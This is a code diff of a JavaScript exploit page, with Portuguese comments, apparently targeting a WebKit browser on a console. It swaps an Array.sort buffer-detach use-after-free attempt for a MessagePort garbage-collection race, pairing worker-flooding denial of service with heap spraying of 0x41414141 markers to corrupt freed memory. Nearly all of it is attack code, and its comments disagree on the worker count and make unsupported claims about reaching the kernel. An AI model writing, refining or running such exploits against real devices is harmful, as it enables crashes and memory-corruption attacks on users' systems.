@@ -17,7 +17,7 @@
 
     <script>
         let keeps = [];
-        const TARGET_CHOKE_ZONE = 401; // Limite de asfixia antes do crash por DoS
+        const TARGET_CHOKE_ZONE = 402; // Limite de asfixia antes do crash por DoS
 
         function log(msg) {
             const el = document.getElementById('log');
@@ -60,42 +60,58 @@
             }, 5);
         }
 
-        // --- FASE 2: O Payload de Corrupção (O seu runSortDetach) ---
-        function executeSortDetachUAF() {
-            log("\n[!!!] FASE 2: EXECUTANDO SORT DETACH NA JANELA DE RACE CONDITION [!!!]");
+        // --- FASE 2: Payload de Corrupção (MessagePort GC Race) ---
+        function executeMessagePortGCRace() {
+            log("\n[!!!] FASE 2: EXECUTANDO MESSAGEPORT GC RACE NA JANELA DE LENTIDÃO [!!!]");
             
             try {
-                const buffer = new ArrayBuffer(1024 * 1024 * 2); // 2MB para garantir processamento lento
-                const array = new Uint8Array(buffer);
+                log("[*] Criando canal de comunicação e Worker fantasma...");
+                let mc = new MessageChannel();
                 
-                // Preenche com lixo para o sort processar
-                for(let i=0; i < array.length; i++) array[i] = Math.random() * 255;
+                // Worker simples apenas para manter a outra ponta do canal aberta no kernel
+                const workerCode = `onmessage = (e) => { /* Apenas recebe a porta */ }`;
+                const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+                let w = new Worker(url);
                 
-                // Worker fantasma apenas para receber a transferência (detach)
-                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
-                let detached = false;
+                // Envia a Porta 2 para o Worker (estabelece o roteamento IPC nativo)
+                w.postMessage("init", [mc.port2]);
                 
-                log("[*] Iniciando Array.sort()...");
+                log("[*] Inundando a Porta 1 local com mensagens pesadas...");
+                // Preenchemos a fila com lixo para atrasar o processamento do C++
+                let payload = new ArrayBuffer(1024 * 512); // 500KB
+                for(let i = 0; i < 150; i++) {
+                    mc.port1.postMessage(payload);
+                }
                 
-                // O GOLPE: Devido à lentidão extrema da Fase 1, o WebKit vai engasgar 
-                // entre a transferência de memória e a verificação de segurança do JIT.
-                array.sort((a, b) => {
-                    if (!detached) {
-                        log("[*] Comparador acionado. Executando postMessage (Detach) do Buffer...");
-                        w.postMessage(buffer, [buffer]); 
-                        detached = true;
-                    }
-                    // Retorna um cálculo inútil para forçar a leitura do Array desanexado
-                    return a - b; 
-                });
+                log("[*] Fila cheia. Disparando Teardown assíncrono e forçando Garbage Collection...");
                 
-                log("[-] Sort finalizado. Se o console não crashou, a Race Condition falhou e o WebKit geriu o erro.");
+                // O GOLPE: Fechamos a porta local e matamos o Worker simultaneamente.
+                // Como o sistema tem 401 SharedWorkers a estrangular a CPU, o WebKit vai
+                // engasgar ao tentar limpar as 150 mensagens pendentes.
+                mc.port1.close();
                 w.terminate();
                 
+                // Anulamos as referências no JavaScript. Isto avisa o Garbage Collector 
+                // para apagar as estruturas nativas (UAF trigger).
+                mc = null;
+                w = null;
+                
+                // Pressão de Memória (Heap Grooming)
+                // Alocamos blocos gigantes de lixo imediatamente para forçar o GC a agir AGORA
+                // e sobrescrever a memória libertada pelo MessageChannel.
+                let gcPressure = [];
+                for(let i = 0; i < 20; i++) {
+                    let spray = new Uint32Array(1024 * 1024 * 2); // 8MB chunks
+                    spray.fill(0x41414141); // 'AAAA' - Marcador de controlo
+                    gcPressure.push(spray);
+                }
+                
+                log("[-] Payload disparado. Verifique o comportamento da consola.");
+                log("    -> Se a aba fechar subitamente: Possível UAF (Userland Crash).");
+                log("    -> Se desligar: Corrupção atingiu o roteador do Kernel.");
+                
             } catch(e) {
-                // Se cair aqui, o WebKit ainda conseguiu ser rápido o suficiente para lançar o TypeError
-                log(`[X] Falha no Payload: O WebKit bloqueou o acesso ilegal. Erro: ${e.message}`);
-                log("    Dica: Aumente ou diminua os 403 Workers para encontrar o ponto de asfixia perfeito.");
+                log(`[X] Erro no Payload: ${e.message}`);
             }
         }
     </script>
